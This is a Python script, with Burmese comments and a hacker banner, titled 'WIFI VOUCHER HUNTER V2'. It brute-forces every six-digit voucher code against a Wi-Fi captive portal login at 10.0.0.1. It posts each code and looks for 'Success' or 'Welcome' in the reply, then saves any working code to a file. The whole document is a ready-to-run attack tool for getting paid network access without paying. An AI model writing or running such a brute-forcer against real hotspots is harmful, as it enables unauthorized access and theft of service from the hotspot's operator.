​import requests
import sys
import time

# Colors for Termux
GREEN = '\033[92m'
RED = '\033[91m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
MAGENTA = '\033[95m'
RESET = '\033[0m'

# Hacker Face & Banner
HACKER_FACE = f"""
{RED}
               _..._
             .'     '.
            /  _   _  \\
           |  (o) (o)  |
           |   _   _   |
            \\  \\_/_/  /
             '._   _.'
                ' '
{CYAN}      [ WIFI VOUCHER HUNTER V2 ]
{GREEN}    ===============================
{RESET}"""

url = "http://10.0.0.1/login" 

def brute_force():
    print(HACKER_FACE)
    print(f"{YELLOW}[*] Target URL: {url}{RESET}")
    print(f"{YELLOW}[*] Thread: Single | Mode: 6-Digit{RESET}\n")
    
    # Loading animation characters
    animation = ["|", "/", "-", "\\"]
    
    try:
        for i in range(0, 1000000):
            voucher = str(i).zfill(6)
            
            # ခဏခဏ ပြောင်းနေမယ့် animation symbol
            idx = i % len(animation)
            
            # --- ဒီအပိုင်းမှာ design ကို အလန်းဆုံး ပြင်ထားပါတယ် ---
            # [ / ] Testing >> 000123 << [ Progress: 0.1% ]
            percent = (i / 1000000) * 100
            sys.stdout.write(
                f"\r{MAGENTA}[ {animation[idx]} ] {RESET}"
                f"{CYAN}Testing >> {GREEN}{voucher}{CYAN} << {RESET}"
                f"{YELLOW}[ {percent:.2f}% ]{RESET}"
            )
            sys.stdout.flush()

            data = {
                'voucherCode': voucher, # Login page ရဲ့ box name ဖြစ်ရပါမယ်
                'submit': 'Login'
            }
            
            try:
                # Target Server ဆီ စမ်းကြည့်ခြင်း
                response = requests.post(url, data=data, timeout=2)
                
                # အကယ်၍ အမှန်တွေ့ခဲ့လျှင်
                if "Success" in response.text or "Welcome" in response.text:
                    print(f"\n\n{GREEN}" + "!"*40)
                    print(f"[+] CONGRATULATIONS! CODE FOUND")
                    print(f"[+] VALID VOUCHER: {YELLOW}{voucher}{GREEN}")
                    print("!"*40 + f"{RESET}")
                    
                    with open("found_vouchers.txt", "a") as f:
                        f.write(f"Voucher: {voucher} | URL: {url}\n")
                    
                    print(f"\n{CYAN}[*] Saved to: found_vouchers.txt{RESET}")
                    return # ရပ်လိုက်မယ်
                    
            except requests.exceptions.RequestException:
                # Connection ပြတ်ရင် စာတန်းလေးပြပြီး ဆက်သွားမယ်
                sys.stdout.write(f"{RED} [!] Link Error{RESET}")
                continue

    except KeyboardInterrupt:
        print(f"\n\n{RED}[!] Tool stopped by user. Happy Hunting!{RESET}")
        sys.exit()

if __name__ == "__main__":
    brute_force()
